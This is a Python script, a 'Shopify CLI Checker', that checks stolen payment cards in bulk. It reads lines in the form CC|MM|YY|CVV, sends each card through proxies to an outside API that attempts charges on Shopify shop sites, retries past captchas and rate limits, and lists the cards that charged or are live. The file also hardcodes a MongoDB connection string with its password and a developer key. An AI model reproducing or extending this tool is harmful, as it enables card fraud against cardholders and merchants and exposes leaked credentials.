#!/usr/bin/env python3
"""
Shopify CLI Checker v2.1 — Works on server + phone (Termux)
- Sites + Proxies auto-loaded from MongoDB or API fallback
- Same response classification as web
- Sessions stored locally
- Real-time terminal output

Usage:
    python3 cli_checker.py                          # Interactive
    python3 cli_checker.py -f cards.txt             # From file
    python3 cli_checker.py --card "CC|MM|YY|CVV"   # Single card
    python3 cli_checker.py -t 20                    # Threads
"""
from __future__ import annotations

import asyncio
import json
import os
import random
import re
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import httpx
except ImportError:
    print("[!] Run: pip install httpx")
    sys.exit(1)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SCRIPT_DIR = Path(__file__).resolve().parent
SESSION_DIR = SCRIPT_DIR / "sessions"
SESSION_DIR.mkdir(exist_ok=True)

MONGODB_URL = "mongodb+srv://Kyu7cc:85114550As@cluster0.lir48rq.mongodb.net/?appName=Cluster0"
DB_NAME = "kyu7_bot"
SITES_COL = "sites"
PROXIES_COL = "proxies"
OWNER_ID = 6426931258
DEV_KEY = "0YLvS1prjs8PYPv5xuV240b7SHJydlju"

API_URLS = [
    "http://168.220.237.48:5000",
    "https://shopify-api-production-460f.up.railway.app",
]

WEBEX_URL = "http://168.220.237.48:8000"

TIMEOUT_CONNECT = 10
TIMEOUT_READ = 45
MAX_CAPTCHA_RETRIES = 4
MAX_429_RETRIES = 10

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COLORS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class C:
    R = "\033[0m"; B = "\033[1m"
    RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"
    BLU = "\033[94m"; CYN = "\033[96m"; DIM = "\033[2m"

def c(t, cl): return f"{cl}{t}{C.R}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFICATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KW_CHARGED = ["ORDER_PAID","CHARGED","PAYMENT_CAPTURED","THANK YOU","THANK_YOU",
              "THANKS","SUCCESS","SUCCEEDED","ORDER CONFIRM","ORDER_CONFIRM",
              "ORDER_CONFIRMED","PAYMENT RECEIVED","PAYMENT SUCCESSFUL","ORDER_PLACED","PAID"]
KW_APPROVED = ["INSUFFICIENT_FUNDS","INCORRECT_CVC","INCORRECT_CVV","INVALID_CVC",
               "CARD_VELOCITY_EXCEEDED","SPENDING_LIMIT_EXCEEDED","AVS_FAILURE",
               "INCORRECT_ZIP","CVV_MISMATCH","AVS_MISMATCH","AVS_FAILED",
               "ZIP_MISMATCH","CVC_CHECK_FAILED","PICK_UP_CARD","PICKUP_CARD","LOST_CARD"]
KW_3DS = ["3DS_REQUIRED","3DS","3D_AUTHENTICATION","3D_SECURE","3D CC",
          "ACTION_REQUIRED","AUTHENTICATION_REQUIRED","COMPLETEPAYMENTCHALLENGE","CHALLENGE"]
KW_DECLINED = ["CARD_DECLINED","DO NOT HONOR","DO_NOT_HONOR","INVALID_NUMBER",
               "EXPIRED_CARD","INCORRECT_NUMBER","GENERIC_DECLINE","PROCESSING_ERROR",
               "CALL_ISSUER","TRY_AGAIN_LATER","PAYMENT_DECLINED","TRANSACTION_DECLINED",
               "FRAUD_DETECTED","HIGH_RISK","RESTRICTED_CARD","CARD_NOT_SUPPORTED",
               "LIMIT_EXCEEDED","GENERIC_ERROR","INVALID_EXPIRY_DATE","LOST_OR_STOLEN_CARD"]
KW_CAPTCHA = ["CAPTCHA_REQUIRED","CAPTCHA","HCAPTCHA"]
KW_ERROR = ["RATE_LIMITED","THROTTLED","CHECKOUT_LOCKED","GATEWAY_ERROR","GRAPHQL_ERROR",
            "NETWORK_ERROR","TIMEOUT","POLLING_TIMEOUT","UNKNOWN_ERROR","BLOCKED_GATEWAY",
            "SITE ERROR","NOT SHOPIFY","CONNECTION ERROR","SITE NOT SUPPORTED",
            "SERVER ERROR","CLIENT ERROR","PRODUCT NOT FOUND","FAILED","PROXY","JSON"]
KW_RETRY = ["CHECKOUT_EXPIRED","INTERNAL_ERROR","CHECKOUT_LOCKED","TERMS_REFRESH","SESSION IS CLOSED"]

def classify(resp: str) -> str:
    r = resp.upper().strip()
    if not r: return "ERROR"
    for kw in KW_CHARGED:
        if kw in r: return "CHARGED"
    for kw in KW_APPROVED:
        if kw in r: return "APPROVED"
    for kw in KW_3DS:
        if kw in r: return "3DS"
    for kw in KW_CAPTCHA:
        if kw in r: return "CAPTCHA"
    for kw in KW_RETRY:
        if kw in r: return "RETRY"
    for kw in KW_DECLINED:
        if kw in r: return "DEAD"
    for kw in KW_ERROR:
        if kw in r: return "ERROR"
    return "DEAD"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITES & PROXIES LOADER (3 methods: MongoDB → API → File)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def load_sites_api() -> list[str]:
    """Fetch sites from webex server API."""
    try:
        r = httpx.get(f"{WEBEX_URL}/api/cli/sites", params={"dev_key": DEV_KEY}, timeout=15)
        if r.status_code == 200:
            data = r.json()
            sites = [s.get("url", "") for s in data.get("sites", []) if s.get("url")]
            if sites:
                print(c(f"  Sites loaded: {len(sites)}", C.GRN))
            return sites
    except Exception as e:
        print(c(f"  API sites failed: {str(e)[:60]}", C.DIM))
    return []

def load_sites_file() -> list[str]:
    """Fallback: local sites.txt."""
    for fp in [SCRIPT_DIR / "sites.txt"]:
        if not fp.exists():
            continue
        try:
            lines = [l.strip() for l in fp.read_text().splitlines() if l.strip() and not l.startswith("#")]
            if lines:
                print(c(f"  Sites from file: {len(lines)}", C.GRN))
                return lines
        except: pass
    return []

def load_sites() -> list[str]:
    """Load sites: API first, file fallback."""
    sites = load_sites_api()
    if not sites:
        sites = load_sites_file()
    if not sites:
        print(c("  [!] No sites found.", C.YEL))
    return sites

def load_proxies_api() -> list[str]:
    """Fetch proxies from webex server API."""
    try:
        r = httpx.get(f"{WEBEX_URL}/api/cli/proxy", params={"dev_key": DEV_KEY}, timeout=15)
        if r.status_code == 200:
            data = r.json()
            proxies = [p.get("proxy", "") for p in data.get("proxies", []) if p.get("proxy")]
            if proxies:
                print(c(f"  Proxies loaded: {len(proxies)}", C.GRN))
            return proxies
    except Exception:
        pass
    return []

def load_proxies_file() -> list[str]:
    """Fallback: local proxies.txt."""
    for fp in [SCRIPT_DIR / "proxies.txt"]:
        if not fp.exists():
            continue
        try:
            lines = [l.strip() for l in fp.read_text().splitlines() if l.strip() and not l.startswith("#")]
            if lines:
                print(c(f"  Proxies from file: {len(lines)}", C.GRN))
                return lines
        except: pass
    return []

def load_proxies() -> list[str]:
    """Load proxies: API first, file fallback."""
    proxies = load_proxies_api()
    if not proxies:
        proxies = load_proxies_file()
    return proxies

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def parse_card(line: str) -> dict | None:
    line = line.strip()
    if not line or line.startswith("#"): return None
    norm = re.sub(r"[:;/,\s]+", "|", line)
    parts = norm.split("|")
    if len(parts) < 4: return None
    cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if len(yy) == 2: yy = "20" + yy
    if not (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit()): return None
    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_url_idx = 0
_client: httpx.AsyncClient | None = None

def next_api() -> str:
    global _url_idx
    url = API_URLS[_url_idx % len(API_URLS)]
    _url_idx += 1
    return url

async def get_client() -> httpx.AsyncClient:
    global _client
    if _client is None or _client.is_closed:
        _client = httpx.AsyncClient(
            timeout=httpx.Timeout(TIMEOUT_CONNECT, read=TIMEOUT_READ),
            follow_redirects=True,
            limits=httpx.Limits(max_connections=200, max_keepalive_connections=80, keepalive_expiry=20),
        )
    return _client

async def check_card_api(card: dict, site: str, proxy: str = None, req_id: str = "") -> dict:
    api = next_api()
    client = await get_client()
    cc_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
    payload = {"cc": cc_str, "site": site}
    if proxy:
        payload["proxy"] = proxy
    if req_id:
        payload["request_id"] = req_id

    t0 = time.time()
    try:
        resp = await client.post(f"{api}/autossh", json=payload)
        ms = round((time.time() - t0) * 1000)
        d = resp.json()
        txt = d.get("Response", "UNKNOWN")
        st = classify(txt)
        return {"card": cc_str, "site": site, "response": txt,
                "gateway": d.get("Gateway", "NONE"), "price": d.get("Price"),
                "status": st, "time_ms": ms, "proxy": d.get("ProxyIP", "Direct"),
                "currency": d.get("Currency", "USD")}
    except httpx.TimeoutException:
        return {"card": cc_str, "site": site, "response": "TIMEOUT",
                "gateway": "NONE", "price": None, "status": "ERROR",
                "time_ms": round((time.time() - t0) * 1000), "proxy": "N/A", "currency": "USD"}
    except Exception as e:
        return {"card": cc_str, "site": site, "response": str(e)[:80],
                "gateway": "NONE", "price": None, "status": "ERROR",
                "time_ms": round((time.time() - t0) * 1000), "proxy": "N/A", "currency": "USD"}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class Session:
    def __init__(self):
        self.id = datetime.now().strftime("%Y%m%d_%H%M%S") + "_" + os.urandom(3).hex()
        self.file = SESSION_DIR / f"{self.id}.json"
        self.data = {
            "id": self.id, "started": datetime.now().isoformat(),
            "total": 0, "checked": 0,
            "charged": 0, "approved": 0, "three_ds": 0,
            "dead": 0, "captcha": 0, "errors": 0,
            "sites_count": 0, "proxies_count": 0,
            "results": [], "charged_cards": [], "live_cards": [],
        }

    def add(self, r: dict):
        self.data["checked"] += 1
        s = r["status"]
        if s == "CHARGED":
            self.data["charged"] += 1
            self.data["charged_cards"].append(r)
        elif s == "APPROVED":
            self.data["approved"] += 1
            self.data["live_cards"].append(r)
        elif s == "3DS":
            self.data["three_ds"] += 1
        elif s == "CAPTCHA":
            self.data["captcha"] += 1
        elif s == "ERROR":
            self.data["errors"] += 1
        else:
            self.data["dead"] += 1
        self.data["results"].append(r)
        self.save()

    def save(self):
        try:
            self.file.write_text(json.dumps(self.data, indent=1, ensure_ascii=False))
        except: pass

    def finish(self):
        self.data["finished"] = datetime.now().isoformat()
        self.save()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DISPLAY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def banner():
    print()
    print(c("  ╔═══════════════════════════════════════════════════╗", C.CYN))
    print(c("  ║          SHOPIFY CLI CHECKER  v2.1               ║", C.CYN))
    print(c("  ║     Sites + Proxies auto-loaded                  ║", C.CYN))
    print(c("  ╚═══════════════════════════════════════════════════╝", C.CYN))
    print()

def show_result(r: dict, i: int, n: int):
    st = r["status"]
    colors = {"CHARGED": C.GRN, "APPROVED": C.GRN, "3DS": C.YEL,
              "CAPTCHA": C.YEL, "ERROR": C.RED, "DEAD": C.RED}
    icons = {"CHARGED": "+", "APPROVED": "~", "3DS": "~", "CAPTCHA": "L"}
    clr = colors.get(st, C.RED)
    ico = icons.get(st, "-")
    resp = r["response"][:42]
    print(f"  {c(f'[{i}/{n}]', C.DIM)} {c(ico, clr)} "
          f"{c(st, clr):>16s} | {r['card'][:19]} | {r['site'][:22]} | {resp} | {r['time_ms']}ms")

def show_stats(sess: Session, speed: float):
    d = sess.data
    chk, tot = d["checked"], d["total"]
    pct = chk / tot * 100 if tot else 0
    print(f"  {c('─'*60, C.DIM)}")
    print(f"  {c('Progress:', C.B)} {chk}/{tot} ({pct:.0f}%)  "
          f"{c('Charged:', C.B)}{c(str(d['charged']), C.GRN)}  "
          f"{c('Live:', C.B)}{c(str(d['approved']), C.GRN)}  "
          f"{c('3DS:', C.B)}{c(str(d['three_ds']), C.YEL)}  "
          f"{c('Dead:', C.B)}{c(str(d['dead']), C.RED)}  "
          f"{c('Captcha:', C.B)}{c(str(d['captcha']), C.YEL)}  "
          f"{c('Err:', C.B)}{c(str(d['errors']), C.RED)}  "
          f"{c('Speed:', C.B)}{c(f'{speed:.1f}', C.CYN)} c/s")
    print(f"  {c('─'*60, C.DIM)}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN RUNNER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def run_check(cards: list[dict], sites: list[str], proxies: list[str], threads: int):
    sess = Session()
    sess.data["total"] = len(cards)
    sess.data["sites_count"] = len(sites)
    sess.data["proxies_count"] = len(proxies)
    sess.save()

    banner()
    print(c(f"  Cards:    {len(cards)}", C.CYN))
    print(c(f"  Sites:    {len(sites)}", C.CYN))
    print(c(f"  Proxies:  {len(proxies)}", C.CYN))
    print(c(f"  Threads:  {threads}", C.CYN))
    print(c(f"  Session:  {sess.id}", C.DIM))
    print(c(f"  Saved:    {sess.file}", C.DIM))
    print()

    sem = asyncio.Semaphore(threads)
    t0 = time.time()

    async def worker(idx: int, card: dict):
        async with sem:
            site = random.choice(sites) if sites else "vukoo.com"
            proxy = random.choice(proxies) if proxies else None
            rid = f"cli_{sess.id}_{idx}"

            r = await check_card_api(card, site, proxy, rid)

            # Retry on captcha/retry/error
            retries = 0
            while r["status"] in ("CAPTCHA", "RETRY", "ERROR") and retries < MAX_CAPTCHA_RETRIES:
                retries += 1
                await asyncio.sleep(1 + retries)
                site = random.choice(sites) if sites else "vukoo.com"
                proxy = random.choice(proxies) if proxies else None
                r = await check_card_api(card, site, proxy, f"{rid}_r{retries}")
                if r["status"] not in ("CAPTCHA", "RETRY", "ERROR"):
                    break

            # 429 retry
            if "429" in r.get("response", ""):
                for _ in range(MAX_429_RETRIES):
                    await asyncio.sleep(2)
                    site = random.choice(sites) if sites else "vukoo.com"
                    proxy = random.choice(proxies) if proxies else None
                    r = await check_card_api(card, site, proxy, f"{rid}_429")
                    if "429" not in r.get("response", ""):
                        break

            sess.add(r)
            speed = sess.data["checked"] / (time.time() - t0) if time.time() > t0 else 0
            show_result(r, idx + 1, len(cards))
            show_stats(sess, speed)

    print(c("  Checking started...\n", C.GRN))
    await asyncio.gather(*(worker(i, card) for i, card in enumerate(cards)))
    sess.finish()

    elapsed = time.time() - t0
    speed = len(cards) / elapsed if elapsed > 0 else 0

    print(f"\n  {c('='*60, C.CYN)}")
    print(c("  CHECKING COMPLETE", C.B))
    print(f"  {c('='*60, C.CYN)}")
    show_stats(sess, speed)
    print(c(f"  Session: {sess.file}", C.DIM))
    print(c(f"  Time:    {elapsed:.1f}s", C.DIM))

    if sess.data["charged"]:
        print(c(f"\n  *** {sess.data['charged']} CHARGED CARD(S)! ***", C.GRN))
        for r in sess.data["charged_cards"]:
            print(c(f"    => {r['card']} @ {r['site']} ({r['response']})", C.GRN))
    if sess.data["approved"]:
        print(c(f"\n  ** {sess.data['approved']} LIVE/APPROVED CARD(S) **", C.GRN))
        for r in sess.data["live_cards"]:
            print(c(f"    => {r['card']} @ {r['site']} ({r['response']})", C.GRN))
    print()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# INPUT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def interactive_input() -> list[dict]:
    print(c("  Paste cards (CC|MM|YY|CVV), type 'done' or Ctrl+D:", C.CYN))
    cards = []
    while True:
        try:
            line = input("  > ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if line.lower() in ("done", "exit", "q"):
            break
        card = parse_card(line)
        if card:
            cards.append(card)
            print(c(f"    + {card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}", C.GRN))
        else:
            print(c(f"    ! Invalid: {line}", C.RED))
    return cards

def file_input(path: str) -> list[dict]:
    cards = []
    try:
        for line in Path(path).read_text().splitlines():
            card = parse_card(line)
            if card:
                cards.append(card)
    except FileNotFoundError:
        print(c(f"  File not found: {path}", C.RED))
    return cards

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def main():
    import argparse
    p = argparse.ArgumentParser(description="Shopify CLI Checker v2.1")
    p.add_argument("-f", "--file", help="Card file (one per line)")
    p.add_argument("--card", help="Single card: CC|MM|YY|CVV")
    p.add_argument("-t", "--threads", type=int, default=10, help="Threads (default 10)")
    p.add_argument("--sites-file", help="Sites file (overrides auto-load)")
    p.add_argument("--no-proxy", action="store_true", help="Don't use proxies")
    args = p.parse_args()

    banner()

    # Load sites
    print(c("  Loading sites...", C.DIM))
    if args.sites_file:
        try:
            raw = Path(args.sites_file).read_text("utf-8")
            sites = []
            if raw.strip().startswith("["):
                for item in json.loads(raw):
                    url = item.get("url", "") if isinstance(item, dict) else str(item)
                    url = re.sub(r"^(https?://)?", "", url).split("/")[0].strip()
                    if url and "." in url: sites.append(url)
            else:
                for line in raw.splitlines():
                    line = line.strip()
                    if line and not line.startswith("#") and "." in line:
                        url = re.sub(r"^(https?://)?", "", line).split("/")[0].strip()
                        if url: sites.append(url)
            print(c(f"  Sites from file: {len(sites)}", C.GRN))
        except Exception as e:
            print(c(f"  Error: {e}", C.RED))
            sites = []
    else:
        sites = load_sites()

    # Load proxies
    proxies = []
    if not args.no_proxy:
        print(c("  Loading proxies...", C.DIM))
        proxies = load_proxies()

    # Load cards
    cards = []
    if args.card:
        card = parse_card(args.card)
        if card:
            cards.append(card)
        else:
            print(c("[!] Invalid card. Use: CC|MM|YY|CVV", C.RED))
            sys.exit(1)
    elif args.file:
        cards = file_input(args.file)
    else:
        cards = interactive_input()

    if not cards:
        print(c("[!] No cards to check.", C.RED))
        sys.exit(1)

    print()
    asyncio.run(run_check(cards, sites, proxies, args.threads))

if __name__ == "__main__":
    main()
